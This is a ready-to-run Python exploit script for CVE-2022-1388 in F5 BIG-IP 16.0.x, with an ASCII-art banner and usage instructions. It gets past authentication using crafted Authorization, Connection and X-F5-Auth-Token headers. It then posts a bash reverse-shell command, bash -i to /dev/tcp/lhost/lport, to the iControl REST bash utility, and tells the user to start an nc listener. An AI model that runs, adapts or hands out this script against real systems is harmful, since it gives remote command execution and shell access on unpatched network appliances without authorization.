# Exploit Title: F5 BIG-IP 16.0.x - Remote Code Execution (RCE)
# Exploit Author: Yesith Alvarez
# Vendor Homepage: https://www.f5.com/products/big-ip-services
# Version: 16.0.x 
# CVE : CVE-2022-1388

from requests import Request, Session
import sys
import json



def title():
    print('''
    
   _______      ________    ___   ___ ___  ___       __ ____   ___   ___  
  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \     /_ |___ \ / _ \ / _ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____| | __) | (_) | (_) |
 | |      \ \/ / |  __|______/ /| | | |/ /  / /______| ||__ < > _ < > _ < 
 | |____   \  /  | |____    / /_| |_| / /_ / /_      | |___) | (_) | (_) |
  \_____|   \/   |______|  |____|\___/____|____|     |_|____/ \___/ \___/ 
                                                                          
                                                                                                                      
                                                                              
Author: Yesith Alvarez
Github: https://github.com/yealvarez
Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
    ''')   

def exploit(url, lhost, lport):
	url = url + 'mgmt/tm/util/bash'
	data = {
		"command":"run",
		"utilCmdArgs":"-c 'bash -i >& /dev/tcp/"+lhost+"/"+lport+" 0>&1'"
		
	}
	headers = {
		'Authorization': 'Basic YWRtaW46',		
		'Connection':'X-Forwarded-Host, X-F5-Auth-Token',
		'X-F5-Auth-Token': '1'

	}
	s = Session()
	req = Request('POST', url, json=data, headers=headers)
	prepped = req.prepare()
	del prepped.headers['Content-Type']
	resp = s.send(prepped,
	    verify=False,
	    timeout=15
	)
	#print(prepped.headers)
	#print(url)
	#print(resp.headers)
	#print(resp.json())
	print(resp.status_code)


if __name__ == '__main__':
    title()
    if(len(sys.argv) < 4):
    	print('[+] USAGE: python3 %s https://<target_url> lhost lport\n'%(sys.argv[0]))
    	print('[+] USAGE: python3 %s https://192.168.0.10 192.168.0.11 4444\n'%(sys.argv[0]))
    	print('[+] Do not forget to run the listener: nc -lvp 4444\n')
    	exit(0)
    else:
    	exploit(sys.argv[1],sys.argv[2],sys.argv[3])